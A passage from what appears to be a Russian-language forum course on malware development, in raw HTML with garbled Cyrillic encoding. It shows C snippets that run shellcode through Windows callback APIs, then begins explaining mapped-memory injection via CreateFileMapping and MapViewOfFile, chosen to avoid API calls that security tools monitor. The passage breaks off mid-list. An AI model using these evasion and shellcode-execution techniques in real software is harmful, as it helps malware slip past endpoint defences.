–ü—Ä–∏–≤–µ–¥–µ–Ω–Ω—ã–π –Ω–∏–∂–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç –≤—ã–ø–æ–ª–Ω—è–µ—Ç –∫–æ–¥, —Ä–∞—Å–ø–æ–ª–æ–∂–µ–Ω–Ω—ã–π –≤ Payload, –∫–∞–∫ —Ñ—É–Ω–∫—Ü–∏—é –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>if (!EnumChildWindows(NULL, (WNDENUMPROC)Payload, NULL)) {
    printf(&quot;[!] EnumChildWindows –Ω–µ —É–¥–∞–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π: %d \n&quot;, GetLastError());
    return -1;
}</code></pre>
	</div>
</div><br />
<b>–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ EnumUILanguagesW</b><br />
<br />
EnumUILanguagesW –ø–µ—Ä–µ—á–∏—Å–ª—è–µ—Ç —è–∑—ã–∫–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–≥–æ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞ (UI), —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–µ –≤ —Å–∏—Å—Ç–µ–º–µ. –û–Ω –ø—Ä–∏–Ω–∏–º–∞–µ—Ç —Ñ—É–Ω–∫—Ü–∏—é –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –≤ –∫–∞—á–µ—Å—Ç–≤–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ –∏ –ø—Ä–∏–º–µ–Ω—è–µ—Ç —Ñ—É–Ω–∫—Ü–∏—é –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –∫ –∫–∞–∂–¥–æ–º—É —è–∑—ã–∫—É UI –ø–æ–æ—á–µ—Ä–µ–¥–Ω–æ. –û–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ, —á—Ç–æ –ª—é–±–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –≤–º–µ—Å—Ç–æ —Ñ–ª–∞–≥–∞ MUI_LANGUAGE_NAME –≤—Å–µ —Ä–∞–≤–Ω–æ —Ä–∞–±–æ—Ç–∞–µ—Ç.<br />
<br />
–ü—Ä–∏–≤–µ–¥–µ–Ω–Ω—ã–π –Ω–∏–∂–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç –≤—ã–ø–æ–ª–Ω—è–µ—Ç –∫–æ–¥, —Ä–∞—Å–ø–æ–ª–æ–∂–µ–Ω–Ω—ã–π –≤ Payload, –∫–∞–∫ —Ñ—É–Ω–∫—Ü–∏—é –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>if (!EnumUILanguagesW((UILANGUAGE_ENUMPROCW)Payload, MUI_LANGUAGE_NAME, NULL)) {
    printf(&quot;[!] EnumUILanguagesW –Ω–µ —É–¥–∞–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π: %d \n&quot;, GetLastError());
    return -1;
}</code></pre>
	</div>
</div><br />
<b>–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ VerifierEnumerateResource</b><br />
<br />
VerifierEnumerateResource –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏—è —Ä–µ—Å—É—Ä—Å–æ–≤ –≤ —É–∫–∞–∑–∞–Ω–Ω–æ–º –º–æ–¥—É–ª–µ. –†–µ—Å—É—Ä—Å—ã - —ç—Ç–æ –¥–∞–Ω–Ω—ã–µ, –∫–æ—Ç–æ—Ä—ã–µ —Ö—Ä–∞–Ω—è—Ç—Å—è –≤ –º–æ–¥—É–ª–µ (–Ω–∞–ø—Ä–∏–º–µ—Ä, –≤ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–º —Ñ–∞–π–ª–µ –∏–ª–∏ –±–∏–±–ª–∏–æ—Ç–µ–∫–µ –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–æ–π –∫–æ–º–ø–æ–Ω–æ–≤–∫–∏) –∏ –∫ –∫–æ—Ç–æ—Ä—ã–º –º–æ–∂–Ω–æ –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –º–æ–¥—É–ª–µ–º –∏–ª–∏ –¥—Ä—É–≥–∏–º–∏ –º–æ–¥—É–ª—è–º–∏ –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è. –ü—Ä–∏–º–µ—Ä—ã —Ä–µ—Å—É—Ä—Å–æ–≤ –≤–∫–ª—é—á–∞—é—Ç —Å—Ç—Ä–æ–∫–∏, –±–∏—Ç–æ–≤—ã–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è –∏ —à–∞–±–ª–æ–Ω—ã –¥–∏–∞–ª–æ–≥–æ–≤—ã—Ö –æ–∫–æ–Ω.<br />
<br />
VerifierEnumerateResource —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä—É–µ—Ç—Å—è –∏–∑ verifier.dll, –ø–æ—ç—Ç–æ–º—É –º–æ–¥—É–ª—å –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–∏ –∑–∞–≥—Ä—É–∂–µ–Ω —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º LoadLibrary –∏ GetProcAddress WinAPI –¥–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ —Ñ—É–Ω–∫—Ü–∏–∏.<br />
<br />
–û–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ, —á—Ç–æ –µ—Å–ª–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä ResourceType –Ω–µ —Ä–∞–≤–µ–Ω AvrfResourceHeapAllocation, —Ç–æ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –Ω–µ –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∞. AvrfResourceHeapAllocation –ø–æ–∑–≤–æ–ª—è–µ—Ç —Ñ—É–Ω–∫—Ü–∏–∏ –ø–µ—Ä–µ—á–∏—Å–ª—è—Ç—å –≤—ã–¥–µ–ª–µ–Ω–∏–µ –∫—É—á–∏, –≤–∫–ª—é—á–∞—è –±–ª–æ–∫–∏ –º–µ—Ç–∞–¥–∞–Ω–Ω—ã—Ö –∫—É—á–∏.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HMODULE hModule = NULL;
fnVerifierEnumerateResource pVerifierEnumerateResource = NULL;

hModule = LoadLibraryA(&quot;verifier.dll&quot;);
if (hModule == NULL){
    printf(&quot;[!] LoadLibraryA –Ω–µ —É–¥–∞–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π: %d \n&quot;, GetLastError());
    return -1;
}

pVerifierEnumerateResource = GetProcAddress(hModule, &quot;VerifierEnumerateResource&quot;);
if (pVerifierEnumerateResource == NULL) {
    printf(&quot;[!] GetProcAddress –Ω–µ —É–¥–∞–ª–æ—Å—å —Å –æ—à–∏–±–∫–æ–π: %d \n&quot;, GetLastError());
    return -1;
}

// –ù–µ–æ–±—Ö–æ–¥–∏–º–æ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ñ–ª–∞–≥ AvrfResourceHeapAllocation –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏
pVerifierEnumerateResource(GetCurrentProcess(), NULL, AvrfResourceHeapAllocation, (AVRF_RESOURCE_ENUMERATE_CALLBACK)Payload, NULL);</code></pre>
	</div>
</div><br />
<b>–ó–∞–∫–ª—é—á–µ–Ω–∏–µ</b><br />
<br />
–í —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ —Ä–∞—Å—Å–º–æ—Ç—Ä–µ–Ω–æ –Ω–µ—Å–∫–æ–ª—å–∫–æ —Ñ—É–Ω–∫—Ü–∏–π –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –∏ –ø—Ä–æ–¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–æ –∏—Ö –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏. –§—É–Ω–∫—Ü–∏–∏ –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –ø–æ–ª–µ–∑–Ω—ã —Ç–æ–ª—å–∫–æ —Ç–æ–≥–¥–∞, –∫–æ–≥–¥–∞ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ —Ä–∞–±–æ—Ç–∞–µ—Ç –≤ –∞–¥—Ä–µ—Å–Ω–æ–º –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–µ –ø–∞–º—è—Ç–∏ –ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />
–°—Ç—Ä–∞–Ω–∏—Ü—É –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–∏ Microsoft –º–æ–∂–Ω–æ –∏—Å—Å–ª–µ–¥–æ–≤–∞—Ç—å, —á—Ç–æ–±—ã –æ–±–Ω–∞—Ä—É–∂–∏—Ç—å –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞.<br />
<br />
–ö—Ä–æ–º–µ —Ç–æ–≥–æ, <a href="https://github.com/aahmad097/AlternativeShellcodeExec" target="_blank" class="link link--external" rel="noopener"><b><span style="color: rgb(184, 49, 47)">–±—ã–ª —Å–æ–∑–¥–∞–Ω —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–π GitHub</span></b></a>, –∫–æ—Ç–æ—Ä—ã–π —Å–æ–¥–µ—Ä–∂–∏—Ç —Å–ø–∏—Å–æ–∫ –Ω–∞–∏–±–æ–ª–µ–µ —Ä–∞—Å–ø—Ä–æ—Å—Ç—Ä–∞–Ω–µ–Ω–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞.</div>
						

							<h2>–ò–Ω—ä–µ–∫—Ü–∏—è –æ—Ç–æ–±—Ä–∞–∂–∞–µ–º–æ–π –ø–∞–º—è—Ç–∏</h2>

							

							

							<div class="bbWrapper"><h3 class="bbHeading"><a class="u-anchorTarget" name="-lokal-naya-in-yektsiya-otobrazhayemoi-pamyati"></a>–õ–æ–∫–∞–ª—å–Ω–∞—è –∏–Ω—ä–µ–∫—Ü–∏—è –æ—Ç–æ–±—Ä–∞–∂–∞–µ–º–æ–π –ø–∞–º—è—Ç–∏&#8203;<a class="hoverLink" href="#-lokal-naya-in-yektsiya-otobrazhayemoi-pamyati" title="–ü–æ—Å—Ç–æ—è–Ω–Ω–∞—è —Å—Å—ã–ª–∫–∞"></a></h3><h3 class="bbHeading"><a class="u-anchorTarget" name="-vvedeniye"></a>–í–≤–µ–¥–µ–Ω–∏–µ&#8203;<a class="hoverLink" href="#-vvedeniye" title="–ü–æ—Å—Ç–æ—è–Ω–Ω–∞—è —Å—Å—ã–ª–∫–∞"></a></h3>–î–æ —Å–∏—Ö –ø–æ—Ä –≤–æ –≤—Å–µ—Ö –ø—Ä–µ–¥—ã–¥—É—â–∏—Ö —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—è—Ö –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª—Å—è —Ç–∏–ø –ª–æ–∫–∞–ª—å–Ω–æ–π –ø–∞–º—è—Ç–∏ –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è. –õ–æ–∫–∞–ª—å–Ω–∞—è –ø–∞–º—è—Ç—å –≤—ã–¥–µ–ª—è–µ—Ç—Å—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º VirtualAlloc –∏–ª–∏ VirtualAllocEx.<br />
<br />
–ù–∞ —Å–ª–µ–¥—É—é—â–µ–º –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–∏ –ø–æ–∫–∞–∑–∞–Ω–∞ –≤—ã–¥–µ–ª–µ–Ω–Ω–∞—è –ª–æ–∫–∞–ª—å–Ω–∞—è –ø–∞–º—è—Ç—å –≤ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ &quot;LocalThreadHijacking&quot;, —Å–æ–¥–µ—Ä–∂–∞—â–µ–π –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746783380918.png"
		data-src="https://osint42.org/attachments/1746783380918-png.142/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746783380918-png.142/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746783380918.png"
			title="1746783380918.png"
			width="1148" height="279" loading="lazy" />
	</div><br />
<br />
<h3 class="bbHeading"><a class="u-anchorTarget" name="-otobrazhayemaya-pamyat"></a>–û—Ç–æ–±—Ä–∞–∂–∞–µ–º–∞—è –ø–∞–º—è—Ç—å&#8203;<a class="hoverLink" href="#-otobrazhayemaya-pamyat" title="–ü–æ—Å—Ç–æ—è–Ω–Ω–∞—è —Å—Å—ã–ª–∫–∞"></a></h3>–ü—Ä–æ—Ü–µ—Å—Å –≤—ã–¥–µ–ª–µ–Ω–∏—è –ª–æ–∫–∞–ª—å–Ω–æ–π –ø–∞–º—è—Ç–∏ —Ç—â–∞—Ç–µ–ª—å–Ω–æ –æ—Ç—Å–ª–µ–∂–∏–≤–∞–µ—Ç—Å—è —Å—Ä–µ–¥—Å—Ç–≤–∞–º–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∏–∑-–∑–∞ –µ–≥–æ —à–∏—Ä–æ–∫–æ–≥–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–º –ø—Ä–æ–≥—Ä–∞–º–º–∞–º.<br />
<br />
<b>–ß—Ç–æ–±—ã –∏–∑–±–µ–∂–∞—Ç—å —Ç–∞–∫–∏—Ö —á–∞—Å—Ç–æ –∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä—É–µ–º—ã—Ö WinAPI,</b> —Ç–∞–∫–∏—Ö-–∫–∞–∫ VirtualAlloc/Ex –∏ VirtualProtect/Ex, –∏–Ω—ä–µ–∫—Ü–∏—è –æ—Ç–æ–±—Ä–∞–∂–∞–µ–º–æ–π –ø–∞–º—è—Ç–∏ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç —Ç–∏–ø –æ—Ç–æ–±—Ä–∞–∂–∞–µ–º–æ–π –ø–∞–º—è—Ç–∏ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —Ä–∞–∑–ª–∏—á–Ω—ã—Ö WinAPI, —Ç–∞–∫–∏—Ö –∫–∞–∫ CreateFileMapping –∏ MapViewOfFile.<br />
<br />
–¢–∞–∫–∂–µ —Å—Ç–æ–∏—Ç –æ—Ç–º–µ—Ç–∏—Ç—å, —á—Ç–æ WinAPI VirtualProtect/Ex –Ω–µ –º–æ–∂–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –¥–ª—è –∏–∑–º–µ–Ω–µ–Ω–∏—è —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–π –ø–∞–º—è—Ç–∏ –æ—Ç–æ–±—Ä–∞–∂–∞–µ–º–æ–π –ø–∞–º—è—Ç–∏.<br />
<br />
<h3 class="bbHeading"><a class="u-anchorTarget" name="-lokal-naya-in-yektsiya-otobrazhayemoi-pamyati-2"></a>–õ–æ–∫–∞–ª—å–Ω–∞—è –∏–Ω—ä–µ–∫—Ü–∏—è –æ—Ç–æ–±—Ä–∞–∂–∞–µ–º–æ–π –ø–∞–º—è—Ç–∏&#8203;<a class="hoverLink" href="#-lokal-naya-in-yektsiya-otobrazhayemoi-pamyati-2" title="–ü–æ—Å—Ç–æ—è–Ω–Ω–∞—è —Å—Å—ã–ª–∫–∞"></a></h3>–≠—Ç–æ—Ç —Ä–∞–∑–¥–µ–ª –æ–±—ä—è—Å–Ω—è–µ—Ç WinAPI, –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ª–æ–∫–∞–ª—å–Ω–æ–π –∏–Ω—ä–µ–∫—Ü–∏–∏ –æ—Ç–æ–±—Ä–∞–∂–∞–µ–º–æ–π –ø–∞–º—è—Ç–∏.<br />
<br />
<h3 class="bbHeading"><a class="u-anchorTarget" name="-createfilemapping"></a>CreateFileMapping&#8203;<a class="hoverLink" href="#-createfilemapping" title="–ü–æ—Å—Ç–æ—è–Ω–Ω–∞—è —Å—Å—ã–ª–∫–∞"></a></h3>CreateFileMapping —Å–æ–∑–¥–∞–µ—Ç –æ–±—ä–µ–∫—Ç –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è —Ñ–∞–π–ª–∞, –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è—è –¥–æ—Å—Ç—É–ø –∫ —Å–æ–¥–µ—Ä–∂–∏–º–æ–º—É —Ñ–∞–π–ª–∞ —á–µ—Ä–µ–∑ —Ç–µ—Ö–Ω–∏–∫–∏ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è –ø–∞–º—è—Ç–∏.<br />
–≠—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø—Ä–æ—Ü–µ—Å—Å—É —Å–æ–∑–¥–∞—Ç—å –≤–∏—Ä—Ç—É–∞–ª—å–Ω–æ–µ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–æ –ø–∞–º—è—Ç–∏, –∫–æ—Ç–æ—Ä–æ–µ –æ—Ç–æ–±—Ä–∞–∂–∞–µ—Ç—Å—è –Ω–∞ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ —Ñ–∞–π–ª–∞ –Ω–∞ –¥–∏—Å–∫–µ –∏–ª–∏ –Ω–∞ –¥—Ä—É–≥–æ–µ –º–µ—Å—Ç–æ –≤ –ø–∞–º—è—Ç–∏. –§—É–Ω–∫—Ü–∏—è –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –æ–±—ä–µ–∫—Ç–∞ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è —Ñ–∞–π–ª–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>HANDLE CreateFileMappingA(
  [in]           HANDLE                hFile,
  [in, optional] LPSECURITY_ATTRIBUTES lpFileMappingAttributes,     // –ù–µ —Ç—Ä–µ–±—É–µ—Ç—Å—è - NULL
  [in]           DWORD                 flProtect,
  [in]           DWORD                 dwMaximumSizeHigh,           // –ù–µ —Ç—Ä–µ–±—É–µ—Ç—Å—è - NULL
  [in]           DWORD                 dwMaximumSizeLow,
  [in, optional] LPCSTR                lpName                       // –ù–µ —Ç—Ä–µ–±—É–µ—Ç—Å—è - NULL
);</code></pre>
	</div>
</div><br />
–¢—Ä–∏ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã—Ö –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ –¥–ª—è —ç—Ç–æ–π —Ç–µ—Ö–Ω–∏–∫–∏ –æ–±—ä—è—Å–Ω–µ–Ω—ã –Ω–∏–∂–µ. –ü–∞—Ä–∞–º–µ—Ç—Ä—ã, –æ—Ç–º–µ—á–µ–Ω–Ω—ã–µ –∫–∞–∫ –Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã–µ, –º–æ–≥—É—Ç –±—ã—Ç—å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã –≤ NULL.<br />
<ul>
<li data-xf-list-type="ul"><b>hFile</b> ‚Äî –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä —Ñ–∞–π–ª–∞, –∏–∑ –∫–æ—Ç–æ—Ä–æ–≥–æ —Å–æ–∑–¥–∞–µ—Ç—Å—è –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è —Ñ–∞–π–ª–∞. –ü–æ—Å–∫–æ–ª—å–∫—É —Å–æ–∑–¥–∞–Ω–∏–µ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è —Ñ–∞–π–ª–∞ –∏–∑ —Ñ–∞–π–ª–∞ –Ω–µ —Ç—Ä–µ–±—É–µ—Ç—Å—è –≤ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏, –º–æ–∂–µ—Ç –±—ã—Ç—å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω —Ñ–ª–∞–≥ INVALID_HANDLE_VALUE.</li>
<li data-xf-list-type="ul"><b>flProtect</b> ‚Äî –æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç –∑–∞—â–∏—Ç—É —Å—Ç—Ä–∞–Ω–∏—Ü—ã –æ–±—ä–µ–∫—Ç–∞ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è —Ñ–∞–π–ª–∞. –í —ç—Ç–æ–π —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ –±—É–¥–µ—Ç —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ PAGE_EXECUTE_READWRITE.</li>
<li data-xf-list-type="ul"><b>dwMaximumSizeLow</b> ‚Äî —Ä–∞–∑–º–µ—Ä –≤–æ–∑–≤—Ä–∞—â–∞–µ–º–æ–≥–æ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è —Ñ–∞–π–ª–∞. –ó–Ω–∞—á–µ–Ω–∏–µ —ç—Ç–æ–≥–æ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ –±—É–¥–µ—Ç —Ä–∞–∑–º–µ—Ä–æ–º –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏.</li>
</ul><br />
<b>MapViewOfFile</b><br />
<br />
MapViewOfFile –æ—Ç–æ–±—Ä–∞–∂–∞–µ—Ç –æ–±—ä–µ–∫—Ç –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è —Ñ–∞–π–ª–∞ –≤ –∞–¥—Ä–µ—Å–Ω–æ–º –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–µ –ø—Ä–æ—Ü–µ—Å—Å–∞. –û–Ω –ø—Ä–∏–Ω–∏–º–∞–µ—Ç –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –æ–±—ä–µ–∫—Ç–∞ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è —Ñ–∞–π–ª–∞ –∏ –∂–µ–ª–∞–µ–º—ã–µ –ø—Ä–∞–≤–∞ –¥–æ—Å—Ç—É–ø–∞ –∏ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç —É–∫–∞–∑–∞—Ç–µ–ª—å –Ω–∞ –Ω–∞—á–∞–ª–æ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è –≤ –∞–¥—Ä–µ—Å–Ω–æ–º –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–µ –ø—Ä–æ—Ü–µ—Å—Å–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>LPVOID MapViewOfFile(
  [in] HANDLE     hFileMappingObject,
  [in] DWORD      dwDesiredAccess,
  [in] DWORD      dwFileOffsetHigh,           // Not Required - NULL
  [in] DWORD      dwFileOffsetLow,            // Not Required - NULL
  [in] SIZE_T     dwNumberOfBytesToMap
);</code></pre>
	</div>
</div><br />
–¢—Ä–∏ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã—Ö –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ –¥–ª—è —ç—Ç–æ–π —Ç–µ—Ö–Ω–∏–∫–∏ –æ–±—ä—è—Å–Ω–µ–Ω—ã –Ω–∏–∂–µ. –ü–∞—Ä–∞–º–µ—Ç—Ä—ã, –æ—Ç–º–µ—á–µ–Ω–Ω—ã–µ –∫–∞–∫ –Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã–µ, –º–æ–≥—É—Ç –±—ã—Ç—å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã –≤ NULL.<br />
<ul>
<li data-xf-list-type="ul"><b>hFileMappingObject</b> ‚Äî –≤–æ–∑–≤—Ä–∞—â–∞–µ–º—ã–π –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä –∏–∑ WinAPI CreateFileMapping, –∫–æ—Ç–æ—Ä—ã–π —è–≤–ª—è–µ—Ç—Å—è –æ–±—ä–µ–∫—Ç–æ–º –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è —Ñ–∞–π–ª–∞.</li>
<li data-xf-list-type="ul"><b>dwDesiredAccess</b> ‚Äî —Ç–∏–ø –¥–æ—Å—Ç—É–ø–∞ –∫ –æ–±—ä–µ–∫—Ç—É –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è —Ñ–∞–π–ª–∞, –∫–æ—Ç–æ—Ä—ã–π –æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç –∑–∞—â–∏—Ç—É —Å—Ç—Ä–∞–Ω–∏—Ü—ã —Å–æ–∑–¥–∞–Ω–Ω–æ–π —Å—Ç—Ä–∞–Ω–∏—Ü—ã.</li>
<li data-xf-list-type="ul"><b>dwNumberOfBytesToMap</b> ‚Äî —Ä–∞–∑–º–µ—Ä –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏.</li>
